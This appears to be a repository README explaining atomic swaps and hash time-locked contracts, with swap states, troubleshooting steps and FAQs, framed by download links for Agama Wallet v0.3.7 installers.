[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# What Is an Atomic Swap?

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

An atomic swap is a trade of one cryptocurrency for another directly between two wallets, with no exchange holding the funds in between. Both legs either complete or neither does, which is what "atomic" means. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, described by its maker as running through the BarterDEX protocol over hash time-locked contracts.

## You'll see this if

You are comparing ways to move value between two chains and the options look like an exchange account, a bridge, or a swap from your own wallet. Or a swap is in progress and the interface is showing a sequence of steps with a countdown.

| State you see | What is happening |
|---|---|
| "Waiting for counterparty" | The order is posted; nobody has matched it yet |
| "Locked" or "funds locked" | Your leg is committed to a contract with a time limit |
| Countdown timer | The time lock before a refund becomes possible |
| "Completed" | Both legs were claimed; the trade is final |
| "Refunded" after a timeout | The counterparty did not complete, so your leg returned |

## Why it happens

A swap needs a mechanism that prevents one side from taking the other's coin without paying. A hash time-locked contract provides it with two locks: a hash lock that only the correct secret can open, and a time lock that returns the funds if the secret never arrives.

The sequence has four moves:

1. **The initiator locks.** Funds go into an output that can be claimed by whoever reveals a secret whose hash is fixed in advance, or by the original owner after a deadline.
2. **The counterparty locks.** They do the same on their chain, with a longer deadline.
3. **The initiator claims.** Claiming reveals the secret, which lets the counterparty claim the other leg.
4. **The deadlines expire.** If any step stalls, both sides reclaim their own funds once their deadline passes.

Atomicity comes from the shared secret: the only way to take one leg is to reveal the value that unlocks the other. The maker of Agama Wallet describes swaps as peer-to-peer between wallets with funds staying in the user's wallet until the trade executes, and no deposit step. The mechanics are worked through in [how atomic swaps work](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md), and the contract itself in [HTLC explained](https://github.com/agama-wallet/atomic-swaps/blob/main/hash-time-locked-contracts.md).

## Fix

A swap that has not completed is usually waiting, not failing. Work through the states in order.

1. **Check the order book before assuming a match.** A posted order with no counterparty is not a stuck trade.
2. **Confirm your leg is locked, not merely sent.** A lock is a spend to a contract output, which the wallet shows as committed rather than spent.
3. **Note the deadline.** The time lock is what makes a refund possible, and it is measured in blocks, not minutes.
4. **Wait for the counterparty's leg within the window.** If their deadline passes without a claim, your refund path opens.
5. **Claim or refund explicitly.** Recovering a timed-out leg is a transaction, not an automatic reversal, and it needs a fee.
6. **Keep the wallet online and synced while a swap is live.** A wallet that cannot see the chain cannot claim.

The maker of the wallet states that a swap typically takes 5 to 30 minutes depending on the chains and congestion, with KMD and LTC faster and BTC slower. [Atomic swap fees](https://github.com/agama-wallet/atomic-swaps/blob/main/what-a-trade-costs.md) covers what that costs.

## If that did not work

If the interface shows a completed swap but one balance did not change, check confirmations before concluding anything: a claimed output is spendable only after it confirms.

If a swap stalls repeatedly with the same counterparty or pair, the constraint is usually liquidity rather than software. The pairs the maker names as deepest are KMD/BTC, LTC/BTC and KMD/LTC.

If a refund transaction will not broadcast, the deadline may not have passed yet in block terms, or the wallet is not synced to the tip. Neither is a reason to send funds anywhere manually; no legitimate support process asks for a transfer to "unstick" a swap.

Atomicity protects against a counterparty taking both legs. It does not protect against a compromised wallet or a phishing site, which is why [are atomic swaps safe](https://github.com/agama-wallet/atomic-swaps/blob/main/are-they-safe.md) separates the two kinds of risk.

## Prevention

- **Check the pair's liquidity before committing.** A thin book means a long wait, not a cheaper trade.
- **Keep enough balance for the refund fee.** A refund is a transaction and needs its own fee.
- **Do not close the wallet mid-swap.** The deadlines keep running whether or not the software is open.
- **Compare with a bridge before choosing.** The trust assumptions differ; [atomic swaps vs bridges](https://github.com/agama-wallet/atomic-swaps/blob/main/bridges-and-their-tradeoffs.md) sets them side by side.
- **Expect no platform fee, and verify that against the chain.** The maker states no platform fee is charged and only network fees apply; the network fee is visible on-chain either way.

## FAQ

### Is an atomic swap the same as a decentralised exchange?

A DEX is a venue; an atomic swap is the mechanism that can settle a trade without custody. A DEX may use atomic swaps, order books, or both.

### Do atomic swaps require KYC?

No identity check is part of the mechanism, and the maker of Agama Wallet states the wallet needs no account or verification. What the chain records about the addresses involved is a separate question, covered in [no-KYC swaps](https://github.com/agama-wallet/atomic-swaps/blob/main/what-no-kyc-means.md).

### What happens if my computer goes offline during a swap?

The time locks keep running. If you return before your deadline you can still claim; after it, you reclaim your own leg instead. Either way the counterparty cannot take both sides.

### Can an atomic swap be reversed after it completes?

No. Once both legs are claimed the trade is final, which is why the deadline and the pair's liquidity deserve attention before committing rather than after.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [How Atomic Swaps Work, Step by Step](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md)
- [HTLC Explained: Hash Time-Locked Contracts](https://github.com/agama-wallet/atomic-swaps/blob/main/hash-time-locked-contracts.md)
- [Atomic Swaps vs Bridges: Two Ways to Move Value Across Chains](https://github.com/agama-wallet/atomic-swaps/blob/main/bridges-and-their-tradeoffs.md)
- [Are Atomic Swaps Safe? The Risks That Remain](https://github.com/agama-wallet/atomic-swaps/blob/main/are-they-safe.md)
